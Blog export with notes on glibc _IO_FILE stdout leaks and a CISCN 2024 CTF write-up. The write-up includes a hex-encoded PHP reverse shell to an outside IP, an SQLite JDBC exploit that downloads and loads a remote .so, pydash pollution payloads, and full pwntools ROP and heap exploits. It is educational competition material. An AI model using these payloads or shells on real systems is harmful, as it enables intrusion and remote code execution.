[{"title":"IO_FILE","url":"/2023/09/14/IO-FILE/","content":"部分堆题没有给予我们打印堆块中间的机会 这种情况下 无法通过unsortedbin来泄露基址 这里学习一种新办法 通过io file来泄露基址\n在一个程序中 初始的文件描述符为1,2,3 分别对应着标准输入 标准输出 标准错误 当我们调用scanf函数或者read函数的时候 就会通过调用文件描述符0来从终端输入数据 也就意味着我们可以利用这一点来做到泄露数据\nFILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中，然后以链表的形式串联起来，但系统一开始会自动创建的三个文件即stdin、stdout、stderr，它们是在libc上。\nstruct _IO_FILE_plus&#123;    _IO_FILE    file;    _IO_jump_t   *vtable;&#125;\n_IO_FILE的源码\nstruct _IO_FILE &#123;int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags   /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;   /* Current read pointer */  char* _IO_read_end;   /* End of get area. */  char* _IO_read_base;  /* Start of putback+get area. */  char* _IO_write_base; /* Start of put area. */  char* _IO_write_ptr;  /* Current put pointer. */  char* _IO_write_end;  /* End of put area. */  char* _IO_buf_base;   /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */   struct _IO_marker *_markers;   struct _IO_FILE *_chain;   int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */ #define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1]; /*  char* _save_gptr;  char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;\n_IO_list_all变量，其指向FILE链表的头部，结合上面的结构体可知file对应的就是_IO_FILE结构类型vtable对应的就是_IO_jump_t类型。在没有创建其它文件结构时，_IO_list_all指向stderr，然后依次是stdout和stdin，这里通过在前面加上结构体类型可以详细的打印其内存数据信息\npwndbg&gt; p /x *(struct _IO_FILE_plus *) _IO_list_all$1 = &#123;  file = &#123;    _flags = 0xfbad2086,     _IO_read_ptr = 0x0,     _IO_read_end = 0x0,     _IO_read_base = 0x0,     _IO_write_base = 0x0,     _IO_write_ptr = 0x0,     _IO_write_end = 0x0,     _IO_buf_base = 0x0,     _IO_buf_end = 0x0,     _IO_save_base = 0x0,     _IO_backup_base = 0x0,     _IO_save_end = 0x0,     _markers = 0x0,     _chain = 0x7ffff7dce760,     _fileno = 0x2,     _flags2 = 0x0,     _old_offset = 0xffffffffffffffff,     _cur_column = 0x0,     _vtable_offset = 0x0,     _shortbuf = &#123;0x0&#125;,     _lock = 0x7ffff7dcf8b0,     _offset = 0xffffffffffffffff,     _codecvt = 0x0,     _wide_data = 0x7ffff7dcd780,     _freeres_list = 0x0,     _freeres_buf = 0x0,     __pad5 = 0x0,     _mode = 0x0,     _unused2 = &#123;0x0 &lt;repeats 20 times&gt;&#125;  &#125;,   vtable = 0x7ffff7dca2a0&#125;\n_IO_file_jumps，同 *vtable\npwndbg&gt; p _IO_file_jumps$3 = &#123;  __dummy = 0,   __dummy2 = 0,   __finish = 0x7ffff7a6e2d0 &lt;_IO_new_file_finish&gt;,   __overflow = 0x7ffff7a6f2b0 &lt;_IO_new_file_overflow&gt;,   __underflow = 0x7ffff7a6efd0 &lt;_IO_new_file_underflow&gt;,   __uflow = 0x7ffff7a70370 &lt;__GI__IO_default_uflow&gt;,   __pbackfail = 0x7ffff7a71c00 &lt;__GI__IO_default_pbackfail&gt;,   __xsputn = 0x7ffff7a6d8d0 &lt;_IO_new_file_xsputn&gt;,   __xsgetn = 0x7ffff7a6d530 &lt;__GI__IO_file_xsgetn&gt;,   __seekoff = 0x7ffff7a6cb30 &lt;_IO_new_file_seekoff&gt;,   __seekpos = 0x7ffff7a70940 &lt;_IO_default_seekpos&gt;,   __setbuf = 0x7ffff7a6c7f0 &lt;_IO_new_file_setbuf&gt;,   __sync = 0x7ffff7a6c670 &lt;_IO_new_file_sync&gt;,   __doallocate = 0x7ffff7a600b0 &lt;__GI__IO_file_doallocate&gt;,   __read = 0x7ffff7a6d8b0 &lt;__GI__IO_file_read&gt;,   __write = 0x7ffff7a6d130 &lt;_IO_new_file_write&gt;,   __seek = 0x7ffff7a6c8b0 &lt;__GI__IO_file_seek&gt;,   __close = 0x7ffff7a6c7e0 &lt;__GI__IO_file_close&gt;,   __stat = 0x7ffff7a6d120 &lt;__GI__IO_file_stat&gt;,   __showmanyc = 0x7ffff7a71d80 &lt;_IO_default_showmanyc&gt;,   __imbue = 0x7ffff7a71d90 &lt;_IO_default_imbue&gt;&#125;\n_IO_FILE结构体中，_chain字段指向下一个链表节点,此处指向的是stdout\npwndbg&gt;  p  *(struct _IO_FILE_plus *) stdout$1 = &#123;  file = &#123;    _flags = -72540028,     _IO_read_ptr = 0x0,     _IO_read_end = 0x0,     _IO_read_base = 0x0,     _IO_write_base = 0x0,     _IO_write_ptr = 0x0,     _IO_write_end = 0x0,     _IO_buf_base = 0x0,     _IO_buf_end = 0x0,     _IO_save_base = 0x0,     _IO_backup_base = 0x0,     _IO_save_end = 0x0,     _markers = 0x0,     _chain = 0x7ffff7dcda00 &lt;_IO_2_1_stdin_&gt;,     _fileno = 1, //文件描述符，stderr的fileno值为2，stdout的fileno值为1    _flags2 = 0,     _old_offset = -1,     _cur_column = 0,     _vtable_offset = 0 &#x27;\\000&#x27;,     _shortbuf = &quot;&quot;,     _lock = 0x7ffff7dcf8c0 &lt;_IO_stdfile_1_lock&gt;,     _offset = -1,     _codecvt = 0x0,     _wide_data = 0x7ffff7dcd8c0 &lt;_IO_wide_data_1&gt;,     _freeres_list = 0x0,     _freeres_buf = 0x0,     __pad5 = 0,     _mode = 0,     _unused2 = &#x27;\\000&#x27; &lt;repeats 19 times&gt;  &#125;,   vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;&#125;\n利用_fileno字段_fileno的值就是文件描述符，位于stdin文件结构开头0x70偏移处我们可以尝试篡改_fileno以重定位需要读取的文件例子之后再放\nIO_FILE_leak\nint _IO_new_file_overflow (FILE *f, int ch)&#123;  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    &#123;      f-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;  /* If currently reading or no buffer allocated. */  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)    &#123;      /* Allocate a buffer if needed. */      if (f-&gt;_IO_write_base == NULL)\t&#123;\t  _IO_doallocbuf (f);\t  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);\t&#125;      /* Otherwise must be currently reading.\t If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,\t logically slide the buffer forwards one block (by setting the\t read pointers to all point at the beginning of the block).  This\t makes room for subsequent output.\t Otherwise, set the read pointers to _IO_read_end (leaving that\t alone, so it can continue to correspond to the external position). */      if (__glibc_unlikely (_IO_in_backup (f)))\t&#123;\t  size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;\t  _IO_free_backup_area (f);\t  f-&gt;_IO_read_base -= MIN (nbackup,\t\t\t\t   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);\t  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;\t&#125;      if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)\tf-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;      if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\tf-&gt;_IO_write_end = f-&gt;_IO_write_ptr;    &#125;  if (ch == EOF)    return _IO_do_write (f, f-&gt;_IO_write_base,\t\t\t f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);  if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */    if (_IO_do_flush (f) == EOF)      return EOF;  *f-&gt;_IO_write_ptr++ = ch;  if ((f-&gt;_flags &amp; _IO_UNBUFFERED)      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#x27;\\n&#x27;))    if (_IO_do_write (f, f-&gt;_IO_write_base,\t\t      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)      return EOF;  return (unsigned char) ch;&#125;\n\n将堆块分配到stdout指针处存储的_IO_2_1_stdout_该IO_FILE结构体处修改其_flags为0xfbad1800，将后面三个read指针置空将_IO_write_base处的第一个字节改为0x58，后面的_IO_write_ptr和_IO_write_end保持不变。之后当程序遇到puts函数时就会打印_IO_write_base到_IO_write_ptr之间的内容按照上面步骤改动的话，我们泄露出的第一个libc地址是_IO_file_jumps。常用的payload如下所示，至于为啥需要flags&#x3D;0xfbad1800（flags也可以是0xfbad3887），这里分析起来十分复杂，可以参见puts源码，只能说为了达到输出效果需要这样设置另外该flags这样设置只是针对puts函数，其余打印函数略有不同。\npayload = p64(0xfbad1800)+p64(0)*3+b&quot;\\x58&quot;\n\npayload = p64(0xfbad3887)+p64(0)*3+p8(0)\n存一个environ泄露栈地址\np2 = p64(0xfbad1800) + p64(0) * 3 + p64(environ) + p64(environ + 8) * 2 #stdout -&gt; environ leak stack_addr\n前面的攻击手段，以后再来探索吧~\n","categories":["heap"],"tags":["_IO_FILE"]},{"title":"CISCN2024初赛","url":"/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/","content":"Write up written by 吃烧鸡会 pwned\n\n\n\n队伍信息\n密码学有一坨公式不会在md写，待修复\nWebSimple_php过滤了很多，一开始能读文件读目录但是没啥用\nphp -r phpinfo()；发现可以执行php命令php -r eval(hex2bin(substrhp -r phpinfo()；发现可以执行php命令php -r eval(hex2bin(substr(_24736f636b3d66736f636b6f70656e28223132302e37382e3133352e3637222c36363636293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b,1)));反弹shell发现有mysql服务默认账号进去了一路找下来\n\n\neasycms_revenge在官网上发现有个 qrcode 的 ssrf 同时发现题目上有 flag.php\n我猜就是 ssrf 打 flag.php 然后命令执行\n找代码中 qrcode 相关的函数\n\n\n\n其中 thumb 嵌入二维码中间的 logo 图片 URL，dr_catcher_data 函数获取 logo 图片的数据\n\nPayload\n/?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://vps&amp;size=10&amp;level=1\n\n一开始试了一下昨天的姿势，但是发现不通了，返回了一个类似图片认证的东西，我猜测服务器上做了一个类似强制认证图片，加个 GIF89a 试试\nGIF89a&lt;?phpecho &quot;GIF89a&quot;;header(&#x27;Location: http://127.0.0.1/flag.php?cmd=bash弹shell&#x27;,true,302);exit();?&gt;\n\n\nezjava| 复现一开始看到 jdbc 我就以为是 jdbc 打各种依赖，\n\n结果看了一圈都没有见到感觉能打的，后面知道了一个 sqlite 的 cve，CVE-2023-32697\n参考 https://mp.weixin.qq.com/s/JY1C2LqOqbAQvJLIhG8prQ\nimport java.io.File;import java.net.URL;import java.sql.Connection;import java.sql.DriverManager;import java.sql.Statement;public class ciscn2024&#123;    public static void main(String[] args) throws Exception&#123;        Class.forName(&quot;org.sqlite.JDBC&quot;);        String url1 = &quot;http://110.41.152.140/evil.db&quot;;        String url2 = &quot;http://110.41.152.140/shell3.so&quot;;        String tmp = &quot;sqlite-jdbc-tmp-&quot;;        String db = tmp + new URL(url1).hashCode() + &quot;.db&quot;;        System.out.println(db);        String dll = tmp + new URL(url2).hashCode() + &quot;.so&quot;;        System.out.println(dll);        new File(db).delete();        new File(dll).delete();        DriverManager.getConnection(&quot;jdbc:sqlite::resource:&quot;+url1).close();        DriverManager.getConnection(&quot;jdbc:sqlite::resource:&quot;+url2).close();        Connection conn = DriverManager.getConnection(&quot;jdbc:sqlite:file:&quot;+db+&quot;?enable_load_extension=true&quot;);        Statement stmt = conn.createStatement();        String sql = &quot;select load_extension(&#x27;&quot;+dll+&quot;&#x27;,&#x27;dllmain&#x27;)&quot;;        stmt.execute(sql);    &#125;&#125;\n\n先在 vps 开个端口然后让题目访问下载到本地\nPOST /jdbc/connect HTTP/1.1Host: pwn.challenge.ctf.show:28169Content-Type: application/json&#123;&quot;type&quot;:&quot;3&quot;,&quot;url&quot;:&quot;jdbc:sqlite::resource:http://110.41.152.140:81/evil.db&quot;&#125;------------------------------------------------------------------------------&#123;&quot;type&quot;:&quot;3&quot;,&quot;url&quot;:&quot;jdbc:sqlite::resource:http://110.41.152.140:81/evil.db&quot;,&quot;tableName&quot;:&quot;stu union select load_extension(&#x27;/tmp/sqlite-jdbc-tmp--1288104388.so&#x27;),1,1&quot;&#125;\n\nR |sanic| 复现源码\nfrom sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pydash# pydash==5.1.2class Pollute:    def __init__(self):        passapp = Sanic(__name__)app.static(&quot;/static/&quot;, &quot;./static/&quot;)Session(app)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def index(request):    return html(open(&#x27;static/index.html&#x27;).read())@app.route(&quot;/login&quot;)async def login(request):    user = request.cookies.get(&quot;user&quot;)    if user.lower() == &#x27;adm;n&#x27;:        request.ctx.session[&#x27;admin&#x27;] = True        return text(&quot;login success&quot;)    return text(&quot;login fail&quot;)@app.route(&quot;/src&quot;)async def src(request):    return text(open(__file__).read())@app.route(&quot;/admin&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def admin(request):    if request.ctx.session.get(&#x27;admin&#x27;) == True:        key = request.json[&#x27;key&#x27;]        value = request.json[&#x27;value&#x27;]        if key and value and type(key) is str and &#x27;_.&#x27; not in key:            pollute = Pollute()            pydash.set_(pollute, key, value)            return text(&quot;success&quot;)        else:            return text(&quot;forbidden&quot;)    return text(&quot;forbidden&quot;)if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;)\n\n我们得先访问 login 才能访问 admin\n如果想访问 login 的话我们得设置 cookie 为 adm;n，搜了一下貌似没有什么姿势，看看内部实现\n\n只能匹配 0-7，可以用个八进制来绕\n\n然后看 admin\n\n搜一下有个原型链污染，同时我们需要绕过对_.的判断\n\n可以用_\\\\.来绕\n我们可以看到有个 src 路由，\n@app.route(&quot;/src&quot;)async def src(request):    return text(open(__file__).read())\n\n既然我们知道可以原型链污染，那么如果我们污染__file__那么就可以做到 rce\n&#123;&quot;key&quot;:&quot;__init__\\\\\\\\.__globals__\\\\\\\\.__file__&quot;,&quot;value&quot;:&quot;/etc/passwd&quot;&#125;\n\n能够简单 rce 了\n在 ctfshow 上可以直接读取环境变量得到 flag\n但是题目代码中设置了一个 static 目录，我们需要看看这个 static 函数咋样的\n\nexp\n&#123;&quot;key&quot;:&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: True&#125;&#123;&quot;key&quot;:&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: [&quot;/&quot;]&#125;&#123;&quot;key&quot;:&quot;__init__\\\\\\\\.__globals__\\\\\\\\.__file__&quot;,&quot;value&quot;: &quot;/24bcbd0192e591d6ded1_flag&quot;&#125;\n\n\n\nPwngostack题目说明Gopwn x ROP\n解题思路把程序打崩可以打印堆栈信息，可以泄露地址（go 的字符串地址是不变的）\n\n远程打一次，这个是 syscall\n\n找 gadget\n\n符号表不会修就不看逆向了\n直接 rop 开打\nfrom pwn import *from pwn import p64#p = process(&#x27;./gostack&#x27;)p = remote(&quot;8.147.133.230&quot;,33569)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./gostack&#x27;)syscall = 0x404043pop_rax_ret = 0x40f984pop_rdi_14_13_12_rbp_rbx_ret = 0x4a18a5pop_rsi_ret = 0x42138apop_rdx_ret = 0x4944ecbss = 0x05633A0#binsh = 0x000000c000073f70binsh = 0x000000c000043fd8 + 8vuln_main = 0x4A0880payload = p64(0)*58payload += p64(pop_rax_ret) + p64(59)+ p64(pop_rdi_14_13_12_rbp_rbx_ret) + p64(binsh) payload += p64(0)*5 + p64(pop_rdx_ret) + p64(0) + p64(pop_rsi_ret) + p64(0) +p64(syscall)+ p64(0) + b&#x27;/bin/sh\\x00&#x27;p.sendline(payload)p.interactive()\n\n\norange_cat_diary题目说明House of orange + malloc hook\n解题思路add 允许 0x1000 的堆块\n\nfree 和 show 都只有一次\n\n\nedit 存在越界修改和 edit after free\n\n所以使用 edit 能修改 topchunk，再申请一个大堆块就能使原 topchunk 进入 unsortedbin，以此泄露 libc 地址\nfastbin attack 修改 malloc hook 为 onegadget，最后再次申请堆块时触发 onegadget 拿到 shell\n\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./orange_cat_diary&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)#p = process([&quot;./ld-2.23.so&quot;,&quot;./orange_cat_diary&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)p = remote(&quot;8.147.133.9&quot;,31797)def debug():    gdb.attach(p)    pause()def add(size,content):    p.sendlineafter(b&quot;Please input your choice:&quot;,b&#x27;1&#x27;)    p.sendlineafter(b&quot;Please input the length of the diary content:&quot;,str(size))    p.recvuntil(b&quot;Please enter the diary content:\\n&quot;)    p.send(content)def delete():    p.sendlineafter(b&quot;Please input your choice:&quot;,b&#x27;3&#x27;)def edit(_size_,_payload_):    p.sendlineafter(b&quot;Please input your choice:&quot;,b&#x27;4&#x27;)    p.sendlineafter(b&quot;Please input the length of the diary content:&quot;,str(size))    p.sendlineafter(b&quot;content:&quot;,payload)def show():    p.sendlineafter(b&quot;Please input your choice:&quot;,b&#x27;2&#x27;)one = [0x45226,0x4527a,0xf03a4,0xf1247]p.sendlineafter(b&#x27;tell me your name.&#x27;, b&#x27;name&#x27;)add(0x108, b&#x27;a&#x27;)# debug()edit(0x110, b&#x27;b&#x27; * 0x108 + p64(0xef1))add(0x1000, b&#x27;c&#x27;)add(0x60, b&#x27;\\x00&#x27;)show()libc_base= u64((p.recv(6)).ljust(8,b&#x27;\\x00&#x27;)) - 0x3c5100one_gadget = libc_base+one[2]success(&#x27;libc:%s&#x27;%hex(libc_base))#input()_delete()realloc = libc.sym[&quot;__libc_realloc&quot;]edit(0x20, p64(libc_base + libc.symbols[&#x27;__malloc_hook&#x27;] - 0x23))add(0x60, b&#x27;d&#x27;)add(0x60, b&#x27;e&#x27;*0x13+p64(one_gadget))p.sendlineafter(b&#x27;choice:&#x27;, b&#x27;1&#x27;)p.sendlineafter(b&#x27;content:&#x27;, str(0x60))p.interactive()\n\nEzHeap| 复现2.35 的带沙盒堆题，堆风水不会恢复（\n明显的 malloc2stack 后 orw\n\n高版本 + 沙盒堆块的奇妙结构\n\n需要先恢复堆块\nfrom pwn import *from pwn import p64,u64#p = remote(&quot;&quot;,)p = process([&quot;./ld-linux-x86-64.so.2&quot;,&quot;./EzHeap&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)elf = ELF(&quot;./EzHeap&quot;)libc = ELF(&quot;./libc.so.6&quot;)context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)def debug():    gdb.attach(p)    pause()def add(size,content):    p.recvuntil(b&#x27;choice &gt;&gt; &#x27;)    p.sendline(str(&#x27;1&#x27;))    p.recvuntil(b&#x27;size:&#x27;)    p.sendline(str(size))    p.recvuntil(b&#x27;content:&#x27;)    p.sendline(content)def delete(index):    p.sendlineafter(b&quot;choice &gt;&gt; &quot;,str(&#x27;2&#x27;))    p.sendlineafter(b&quot;idx:&quot;,str(index))def edit(index,size,content):    p.sendlineafter(b&quot;choice &gt;&gt; &quot;,str(&#x27;3&#x27;))    p.sendlineafter(b&quot;idx:&quot;,str(index))    p.sendlineafter(b&quot;size:&quot;,str(size))    p.sendafter(b&quot;content:&quot;,content)def show(index):    p.sendlineafter(b&quot;choice &gt;&gt; &quot;,str(&#x27;4&#x27;))    p.sendlineafter(b&quot;idx:&quot;,str(index))debug()add(0x200,b&quot;a&quot;)  #0add(0x200,b&quot;b&quot;)  #1add(0x200,b&quot;c&quot;)  #2add(0x200,b&quot;d&quot;)  #3add(0x200,b&quot;d&quot;)  #4#恢复sandbox造成的堆风水pause()#leak libc basepayload = b&#x27;a&#x27;*0x200+p64(0)+p64(0x421)edit(0,0x500,payload)delete(1)add(0x200,&quot;b&quot;)#debug()show(2)libc_base = u64((p.recv(6)).ljust(8,b&#x27;\\x00&#x27;)) - 0x21ace0success(&quot;libc_base : &quot;+hex(libc_base))pause()#leak heap base_delete(4)edit(3,0x500,b&#x27;a&#x27;*0x210)show(3)p.recvuntil(b&quot;a&quot;*0x210)heap_base = u64(p.recv(5).ljust(8,b&#x27;\\x00&#x27;)) &lt;&lt; 12success(&quot;heap_base : &quot;+hex(heap_base))pause()edit(3,0x500,b&#x27;a&#x27;*0x200+p64(0)+p64(0x211))add(0x200,&quot;b&quot;)IO_2_1_stdout = libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]#pause()add(0x50,b&#x27;a&#x27;)edit(5,0x500,b&#x27;a&#x27;*0x50+p64(0)+p64(0x31)+p64((IO_2_1_stdout-0x20) ^ ((heap_base - 0x2000) &gt;&gt; 12)))target_addr = libc_base+libc.symbols[&#x27;_environ&#x27;]#iofile leak stack addr_add(0x20,b&quot;a&quot;)add(0x20,b&quot;a&quot;)payload = p64(0)*3+p64(libc_base+0x217600)+p64(0xfbad1800)+p64(libc_base+0x21b803)*3+p64(target_addr)+p64(target_addr+8)edit(7,0x500,payload)stack_addr = u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))success(&quot;stack_addr = &quot;+hex(stack_addr))pause()delete(0)delete(4)payload = b&#x27;a&#x27;*0x200+p64(0)+p64(0x211)+p64((stack_addr - 0x178) ^ ((heap_base) &gt;&gt; 12))edit(3,0x500,payload)add(0x200,b&quot;a&quot;)pop_rdi_ret = libc_base + 0x000000000002a3e5pop_rsi_ret = libc_base + 0x000000000002be51pop_rdx_ret = libc_base + 0x0000000000170337pop_rax_ret = libc_base + 0x0000000000045eb0syscall_ret = libc_base + 0x0000000000091316flag_addr = stack_addr - 0x178#orwpayload = b&#x27;/flag\\x00&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_ret)+p64(0)+p64(pop_rax_ret)+p64(2)+p64(syscall_ret)payload += p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(stack_addr+0x300)+p64(pop_rdx_ret)+p64(0x50)+p64(pop_rax_ret)+b&#x27;a&#x27;*6+p64(0)+p64(syscall_ret)payload += p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(stack_addr+0x300)+p64(pop_rdx_ret)+p64(0x50)+p64(pop_rax_ret)+b&#x27;a&#x27;*6+p64(1)+p64(syscall_ret)add(0x200,payload)p.interactive()\n\nCryptoOvO题目描述from Crypto.Util.number import *from secret import flagnbits = 512p = getPrime(nbits)q = getPrime(nbits)n = p * qphi = (p-1) * (q-1)while True:    kk = getPrime(128)    rr = kk + 2    e = 65537 + kk * p + rr * ((p+1) * (q+1)) + 1    if gcd(e, phi) == 1:        breakm = bytes_to_long(flag)c = pow(m, e, n)e = e &gt;&gt; 200 &lt;&lt; 200print(f&#x27;n = &#123;n&#125;&#x27;)print(f&#x27;e = &#123;e&#125;&#x27;)print(f&#x27;c = &#123;c&#125;&#x27;)&quot;&quot;&quot;n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823&quot;&quot;&quot;\n\n解题思路有两个部分\ne = 65537 + kk * p + rr * ((p+1) * (q+1)) + 1if gcd(e, phi) == 1:      break\n\ne = e &gt;&gt; 200 &lt;&lt; 200\n题目里给出了一个奇怪构造的e，e与phi有逆元，且e的后 200 bits 被抹去。根据给出的题目有$$e &#x3D; 65538 + kkp + rr(p+1)(q+1)&#x3D;rrN + rr(p+q+1)+kkp + 65538$$因为 N的 bits 足够大，那么 $$\\frac{e}{N}$$ 就能得到关键的 $$rr$$ 和 $$kk$$ ：rr &#x3D; \\frac{e}{N} \\ kk &#x3D; rr - 2$$令 $$e$$  两边同时乘 $$p$$ ：$$pE &#x3D; rrNp+rr(p^2+N+p)+kkp^2 + 65538p &#x3D; (rr +kk)p^2 + (rr+N +65538)p + rrN$$现在就有了一个关于 $$p$$ 的方程，解出方程就能分解 $$p$$，但是问题在于只给出了 $$e$$ 的高位，而不是完整的 $$e$$。于是考虑在实数上求多项式的根，然后再转到 $$Z_n$$ 上进行 copperSmith。\nPR.&lt;x&gt; = PolynomialRing(RealField(1000))f = (kk+rr)*x**2 + (rr*n+65538)*x + rr*n - e*xres = f.roots()if res:   print(res)   for i in res:      print(i[0])      print(int(i[0]))\n\n完整脚本：\nn = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823rr = e // nkk = rr - 2PR.&lt;x&gt; = PolynomialRing(RealField(1000))f = (kk+rr)*x**2 + (rr*n+65538)*x + rr*n - e*xres = f.roots()if res:   print(res)   for i in res:      # print(i[0])      # print(int(i[0]))      P.&lt;y&gt; = PolynomialRing(Zmod(n))      h = int(i[0]) + y      rt = h.monic().small_roots(X=2^200,beta=0.4)      if rt:         print(rt)         for i in rt:            p = ZZ(gcd(ZZ(h(i)),n))            print(p)            e = 65537 + kk * p + rr * ((p+1) * (q+1)) + 1q = n // ZZ(p)d = pow(e,-1,(p-1)*(q-1))m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))\n\nhash题目说明💡 题目内容：你能仅仅通过一个 Python2.7 自带的 hash 函数的输出，计算出它的原象的 sha384 哈希值吗？\n#!/usr/bin/python2# Python 2.7 (64-bit version)from secret import flagimport os, binascii, hashlibkey = os.urandom(7)print hash(key)print int(hashlib.sha384(binascii.hexlify(key)).hexdigest(), 16) ^ int(binascii.hexlify(flag), 16)\n\n745731258330110123513903983817893117249931704406959869971132956255130487015289848690577655239262013033618370827749581909492660806312017\n\n解题思路1.信息收集首先是用 edge 的 copilot 搜索到了 python2.7 的 hash() 的实现，是 FNV 结构。\nhttps://github.com/neuml/py27hash/blob/master/src/python/py27hash/hash.py\n重点关注 shash()\n同时还有 PEP 456 作为参考\nPEP 456 – Secure and interchangeable hash algorithm | peps.python.org\n也是同样关注 FNV 的具体实现。\n2.题目流程给出的题目里面 key 是随机给出的 7 位的十六进制 bytes 对象，通过 hash() 给出了一个值。\n有映射 $x &#x3D; h(m)$ ，其中 $m$ 叫做原象，这个题目也就是考的原像攻击\n然后将这个值进行 sha384 签名 后跟 flag 做异或。\n针对原像攻击，第一反应就是爆破。但是 7 位十六进制显然过大，$256^7$ 显然不能在比赛期间完全爆破。那么很自然的想到，有没有办法减少搜索范围。于是有了 MITM  的思路。\n减少一半字符，大概在 $256^3$ 那么就比较容易解决了。\n3.解题下面根据 python2.7 的 hash 实现，给出 FNV 这种结构的简易版本\ndef shash(value):    length = len(value)    mask = 0xffffffffffffffff    x = (value[0] &lt;&lt; 7) &amp; mask    for c in value:        x = (1000003 * x) &amp; mask ^ c    x ^= length &amp; mask    return x\n\n可以知道第一个字符被左移 7 位，而后再有\nx = (1000003 * x) &amp; mask ^ c\nx ^= length &amp; mask\n那么尝试代入 MITM ，只要前四个字符跟后三个字符的逆是相同的，那就满足 key 的条件。\n(x ^ c) &amp; mask = (1000003 * x)\nx = (x ^ c) * 16109806864799210091 &amp; 